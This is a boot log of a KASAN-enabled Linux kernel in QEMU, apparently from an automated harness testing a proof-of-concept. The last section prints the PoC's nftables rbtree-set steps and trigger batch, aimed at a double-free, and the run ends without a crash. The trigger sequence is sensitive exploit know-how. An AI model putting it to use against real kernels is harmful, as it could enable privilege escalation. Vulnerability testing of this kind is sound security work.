bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+BEFCEF00+BEF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004db93a8
input_len: 0x0000000001a11698
output: 0x0000000001000000
output_len: 0x0000000005753144
kernel_total_size: 0x0000000005430000
needed_size: 0x0000000005800000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.5.0-00001-g5a9c274b1e85-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #2 SMP PREEMPT_DYNAMIC Fri May  8 07:22:31 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x00000000bffdffff] usable
[    0.000000] BIOS-e820: [mem 0x00000000bffe0000-0x00000000bfffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000100000000-0x000000013fffffff] usable
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000003] kvm-clock: using sched offset of 433570470 cycles
[    0.001693] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.007079] tsc: Detected 2995.200 MHz processor
[    0.008634] last_pfn = 0x140000 max_arch_pfn = 0x400000000
[    0.009994] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.011960] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.013688] last_pfn = 0xbffe0 max_arch_pfn = 0x400000000
[    0.020161] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.021843] Using GB pages for direct mapping
[    0.023078] Incomplete global flushes, disabling PCID
[    0.023990] RAMDISK: [mem 0xbfe4f000-0xbffdffff]
[    0.026757] ACPI: Early table checksum verification disabled
[    0.028346] ACPI: RSDP 0x00000000000F59B0 000014 (v00 BOCHS )
[    0.030003] ACPI: RSDT 0x00000000BFFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.031983] ACPI: FACP 0x00000000BFFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.034071] ACPI: DSDT 0x00000000BFFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.036588] ACPI: FACS 0x00000000BFFE0000 000040
[    0.038100] ACPI: APIC 0x00000000BFFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.040513] ACPI: HPET 0x00000000BFFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.044500] ACPI: WAET 0x00000000BFFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.046427] ACPI: Reserving FACP table memory at [mem 0xbffe19df-0xbffe1a52]
[    0.047992] ACPI: Reserving DSDT table memory at [mem 0xbffe0040-0xbffe19de]
[    0.049667] ACPI: Reserving FACS table memory at [mem 0xbffe0000-0xbffe003f]
[    0.051451] ACPI: Reserving APIC table memory at [mem 0xbffe1a53-0xbffe1ad2]
[    0.053150] ACPI: Reserving HPET table memory at [mem 0xbffe1ad3-0xbffe1b0a]
[    0.054768] ACPI: Reserving WAET table memory at [mem 0xbffe1b0b-0xbffe1b32]
[    0.056557] No NUMA configuration found
[    0.057475] Faking a node at [mem 0x0000000000000000-0x000000013fffffff]
[    0.059399] NODE_DATA(0) allocated [mem 0x13fffa000-0x13fffdfff]
[    0.061001] Zone ranges:
[    0.061667]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.063106]   DMA32    [mem 0x0000000001000000-0x00000000ffffffff]
[    0.064515]   Normal   [mem 0x0000000100000000-0x000000013fffffff]
[    0.066012] Movable zone start for each node
[    0.067008] Early memory node ranges
[    0.067950]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.069664]   node   0: [mem 0x0000000000100000-0x00000000bffdffff]
[    0.071162]   node   0: [mem 0x0000000100000000-0x000000013fffffff]
[    0.072676] Initmem setup node 0 [mem 0x0000000000001000-0x000000013fffffff]
[    0.074979] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.075024] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.108606] On node 0, zone Normal: 32 pages in unavailable ranges
[    0.302966] kasan: KernelAddressSanitizer initialized
[    0.308041] ACPI: PM-Timer IO Port: 0x608
[    0.310666] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.312713] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.314329] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.315827] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.317378] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.318901] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.320460] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.322156] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.324185] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.325925] TSC deadline timer available
[    0.327107] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.328618] kvm-guest: KVM setup pv remote TLB flush
[    0.330089] kvm-guest: setup PV sched yield
[    0.331100] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.332777] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.334518] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.336300] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.338127] PM: hibernation: Registered nosave memory: [mem 0xbffe0000-0xbfffffff]
[    0.339874] PM: hibernation: Registered nosave memory: [mem 0xc0000000-0xfeffbfff]
[    0.341769] PM: hibernation: Registered nosave memory: [mem 0xfeffc000-0xfeffffff]
[    0.344507] PM: hibernation: Registered nosave memory: [mem 0xff000000-0xfffbffff]
[    0.346944] PM: hibernation: Registered nosave memory: [mem 0xfffc0000-0xffffffff]
[    0.349309] [mem 0xc0000000-0xfeffbfff] available for PCI devices
[    0.350855] Booting paravirtualized kernel on KVM
[    0.351942] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.364553] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.369438] percpu: Embedded 66 pages/cpu s232168 r8192 d29976 u1048576
[    0.371263] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.373372] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.378441] random: crng init done
[    0.384524] Dentry cache hash table entries: 524288 (order: 10, 4194304 bytes, linear)
[    0.388968] Inode-cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.391045] Fallback order for Node 0: 0 
[    0.391055] Built 1 zonelists, mobility grouping on.  Total pages: 1031904
[    0.392902] Policy zone: Normal
[    0.393438] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.394620] stackdepot: allocating hash table via alloc_large_system_hash
[    0.399022] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.400644] software IO TLB: area num 2.
[    0.480792] Memory: 3423244K/4193784K available (49152K kernel code, 7999K rwdata, 10244K rodata, 5688K init, 2772K bss, 770284K reserved, 0K cma-reserved)
[    0.484452] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.487394] Dynamic Preempt: voluntary
[    0.488933] rcu: Preemptible hierarchical RCU implementation.
[    0.490083] rcu: 	RCU event tracing is enabled.
[    0.491203] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.492547] 	Trampoline variant of Tasks RCU enabled.
[    0.493563] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.495126] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.504369] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.506103] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.513978] Console: colour VGA+ 80x25
[    0.514981] printk: console [ttyS0] enabled
[    0.514981] printk: console [ttyS0] enabled
[    0.517742] printk: bootconsole [earlyser0] disabled
[    0.517742] printk: bootconsole [earlyser0] disabled
[    0.520147] ACPI: Core revision 20230331
[    0.521332] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.525467] APIC: Switch to symmetric I/O mode setup
[    0.526420] kvm-guest: setup PV IPIs
[    0.529018] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.530151] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    0.532389] Calibrating delay loop (skipped) preset value.. 5990.40 BogoMIPS (lpj=2995200)
[    0.533897] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.535541] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.536357] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.537403] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.538363] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.539357] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.540356] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.541356] RETBleed: Mitigation: Enhanced IBRS
[    0.542360] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.543357] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.544357] MMIO Stale Data: Unknown: No mitigations
[    0.545396] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.546357] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.547357] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.548357] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.549357] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.567299] Freeing SMP alternatives memory: 44K
[    0.567358] pid_max: default: 32768 minimum: 301
[    0.568433] LSM: initializing lsm=capability,selinux,integrity
[    0.569377] SELinux:  Initializing.
[    0.570437] Mount-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    0.571362] Mountpoint-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    0.573460] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    0.574585] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    0.575404] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    0.576413] signal: max sigframe size: 1776
[    0.577418] rcu: Hierarchical SRCU implementation.
[    0.578363] rcu: 	Max phase no-delay instances is 400.
[    0.579848] smp: Bringing up secondary CPUs ...
[    0.580587] smpboot: x86: Booting SMP configuration:
[    0.581362] .... node  #0, CPUs:      #1
[    0.583466] smp: Brought up 1 node, 2 CPUs
[    0.585336] smpboot: Max logical packages: 1
[    0.585362] smpboot: Total of 2 processors activated (11980.80 BogoMIPS)
[    0.587434] devtmpfs: initialized
[    0.590163] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.590365] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.591599] PM: RTC time: 07:22:56, date: 2026-05-08
[    0.592574] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.593606] audit: initializing netlink subsys (disabled)
[    0.595164] audit: type=2000 audit(1778224976.350:1): state=initialized audit_enabled=0 res=1
[    0.595412] thermal_sys: Registered thermal governor 'step_wise'
[    0.596360] thermal_sys: Registered thermal governor 'user_space'
[    0.597390] cpuidle: using governor menu
[    0.599742] PCI: Using configuration type 1 for base access
[    0.600561] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.604354] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.605362] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.607904] ACPI: Added _OSI(Module Device)
[    0.608362] ACPI: Added _OSI(Processor Device)
[    0.609360] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.611374] ACPI: Added _OSI(Processor Aggregator Device)
[    0.619628] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.679137] ACPI: Interpreter enabled
[    0.679409] ACPI: PM: (supports S0 S3 S4 S5)
[    0.680323] ACPI: Using IOAPIC for interrupt routing
[    0.680425] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.681360] PCI: Using E820 reservations for host bridge windows
[    0.682804] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.696290] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.696372] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.697360] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.698423] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.699582] PCI host bridge to bus 0000:00
[    0.700369] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.701368] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.702386] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.703365] pci_bus 0000:00: root bus resource [mem 0xc0000000-0xfebfffff window]
[    0.704368] pci_bus 0000:00: root bus resource [mem 0x140000000-0x1bfffffff window]
[    0.705368] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.706470] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.712693] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.718918] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.720758] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.721982] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.722361] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.723373] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.724363] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.726143] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.727342] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.727380] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.728913] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.730735] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.732789] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.736236] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.736967] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.742977] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.744003] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.744871] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.747892] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.755396] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.756882] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.757846] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.758925] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.759598] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.761961] iommu: Default domain type: Translated
[    0.762362] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.763822] SCSI subsystem initialized
[    0.764575] ACPI: bus type USB registered
[    0.765447] usbcore: registered new interface driver usbfs
[    0.766382] usbcore: registered new interface driver hub
[    0.768381] usbcore: registered new device driver usb
[    0.769471] pps_core: LinuxPPS API ver. 1 registered
[    0.770362] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.773382] PTP clock support registered
[    0.774516] Advanced Linux Sound Architecture Driver Initialized.
[    0.777516] NetLabel: Initializing
[    0.778244] NetLabel:  domain hash size = 128
[    0.779363] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.780452] NetLabel:  unlabeled traffic allowed by default
[    0.782461] PCI: Using ACPI for IRQ routing
[    0.783665] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.784354] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.784354] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.789366] vgaarb: loaded
[    0.791792] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.793364] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.799827] clocksource: Switched to clocksource kvm-clock
[    0.841151] VFS: Disk quotas dquot_6.6.0
[    0.842198] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.844073] pnp: PnP ACPI init
[    0.846360] pnp: PnP ACPI: found 6 devices
[    0.859606] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.861914] NET: Registered PF_INET protocol family
[    0.863539] IP idents hash table entries: 65536 (order: 7, 524288 bytes, linear)
[    0.866249] tcp_listen_portaddr_hash hash table entries: 2048 (order: 3, 32768 bytes, linear)
[    0.868440] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.870466] TCP established hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.872524] TCP bind hash table entries: 32768 (order: 8, 1048576 bytes, linear)
[    0.874889] TCP: Hash tables configured (established 32768 bind 32768)
[    0.876698] UDP hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    0.878444] UDP-Lite hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    0.880288] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.882287] RPC: Registered named UNIX socket transport module.
[    0.883735] RPC: Registered udp transport module.
[    0.884796] RPC: Registered tcp transport module.
[    0.885849] RPC: Registered tcp-with-tls transport module.
[    0.887018] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.889195] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.890940] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.892541] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.894271] pci_bus 0000:00: resource 7 [mem 0xc0000000-0xfebfffff window]
[    0.896075] pci_bus 0000:00: resource 8 [mem 0x140000000-0x1bfffffff window]
[    0.898046] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.899434] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.900887] PCI: CLS 0 bytes, default 64
[    0.901848] PCI-DMA: Using software bounce buffering for IO (SWIOTLB)
[    0.902059] Unpacking initramfs...
[    0.903426] software IO TLB: mapped [mem 0x00000000bbe4f000-0x00000000bfe4f000] (64MB)
[    0.909006] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.911048] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    0.917401] Initialise system trusted keyrings
[    0.918949] workingset: timestamp_bits=56 max_order=20 bucket_order=0
[    0.921725] NFS: Registering the id_resolver key type
[    0.923263] Key type id_resolver registered
[    0.924439] Key type id_legacy registered
[    0.925600] 9p: Installing v9fs 9p2000 file system support
[    0.934155] Freeing initrd memory: 1604K
[    0.934394] Key type asymmetric registered
[    0.936777] Asymmetric key parser 'x509' registered
[    0.938290] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.941148] io scheduler mq-deadline registered
[    0.942569] io scheduler kyber registered
[    0.944654] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.947101] ACPI: button: Power Button [PWRF]
[    0.948889] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.950559] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.954234] Non-volatile memory driver v1.3
[    0.955589] Linux agpgart interface v0.103
[    0.956997] ACPI: bus type drm_connector registered
[    0.962604] loop: module loaded
[    0.965403] scsi host0: ata_piix
[    0.966826] scsi host1: ata_piix
[    0.967948] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.970406] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.973902] e100: Intel(R) PRO/100 Network Driver
[    0.976173] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.978470] e1000: Intel(R) PRO/1000 Network Driver
[    0.979889] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.130974] ata2: found unknown device (class 0)
[    1.132647] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.135840] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.187828] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.189317] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.198813] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    1.419310] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.772766] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.774974] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.776882] e1000e: Intel(R) PRO/1000 Network Driver
[    1.778137] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.779913] sky2: driver version 1.30
[    1.781227] usbcore: registered new interface driver usblp
[    1.782614] usbcore: registered new interface driver usb-storage
[    1.784148] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.787366] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.789434] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.792142] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.793001] rtc_cmos 00:05: RTC can wake from S4
[    1.797642] rtc_cmos 00:05: registered as rtc0
[    1.798983] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.803430] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    1.805605] intel_pstate: CPU model not supported
[    1.806925] hid: raw HID events driver (C) Jiri Kosina
[    1.809294] usbcore: registered new interface driver usbhid
[    1.811782] usbhid: USB HID core driver
[    1.814694] Initializing XFRM netlink socket
[    1.815831] NET: Registered PF_INET6 protocol family
[    1.817807] Segment Routing with IPv6
[    1.818809] In-situ OAM (IOAM) with IPv6
[    1.819885] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.821628] NET: Registered PF_PACKET protocol family
[    1.822943] 9pnet: Installing 9P2000 support
[    1.824257] Key type dns_resolver registered
[    1.826289] IPI shorthand broadcast: enabled
[    1.837978] sched_clock: Marking stable (1816035404, 21856742)->(1931703668, -93811522)
[    1.840185] registered taskstats version 1
[    1.841250] Loading compiled-in X.509 certificates
[    1.850035] PM:   Magic number: 10:158:369
[    1.851225] printk: console [netcon0] enabled
[    1.852613] netconsole: network logging started
[    1.854182] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.856490] kworker/u4:1 (51) used greatest stack depth: 29536 bytes left
[    1.858417] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.859967] ALSA device list:
[    1.860746]   No soundcards found.
[    1.862835] Freeing unused kernel image (initmem) memory: 5688K
[    1.865018] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.866355] cfg80211: failed to load regulatory.db
[    1.869730] Write protecting the kernel read-only data: 61440k
[    1.871117] Freeing unused kernel image (rodata/data gap) memory: 2044K
[    1.882278] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.883013] Run /init as init process
[    1.886358] mount (55) used greatest stack depth: 28744 bytes left

secb: rootfs ready
---- poc begin ----
[*] batch 1: NEWTABLE t1, NEWOBJ obj1, NEWSET rbset (rbtree TIMEOUT|OBJECT|INTERVAL, key_len=0x40)
    [drain b1] acks=3 errs=0
    [drain b2-0x80] acks=1 errs=0
    [drain b3-0x70] acks=1 errs=0
    [drain b4-0x60] acks=1 errs=0
[    2.443523] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
    [drain b5-0x50] acks=1 errs=0
    [drain b6-0x40-expired] acks=1 errs=0
[*] batches 2..6: 5 NEWSETELEM (each in own committed batch) -- 0x80/0x70/0x60/0x50 @ 60s, 0x40 @ 1ms
[*] TRIGGER batch: NEWSETELEM 0x58 INTERVAL_END | NEWSETELEM 0x48 (gc) | NEWSETELEM nope_set 0x10 (poison)
    [!] trigger-abort ack seq=23 err=2 (No such file or directory)
    [drain trigger-abort] acks=3 errs=1
[*] trigger sent — expect msg C ack=ENOENT, abort fires, double-free of 0x58 at next RCU grace
[*] DELSET rbset (sync barrier for in-flight gc trans)
    [drain delset] acks=1 errs=0
    [dump] nlmsg_type=0x0002 len=60 flags=0x0 seq=28
    [dump err] err=2
[*] GETSETELEM dump: 1 msgs total, 0 NEWSETELEM-typed, done=0, err=1
[+] poc finished
[    3.613934] poc (61) used greatest stack depth: 27648 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    4.949410] ACPI: PM: Preparing to enter system sleep state S5
[    4.950921] reboot: Power down
NO_CRASH_DETECTED
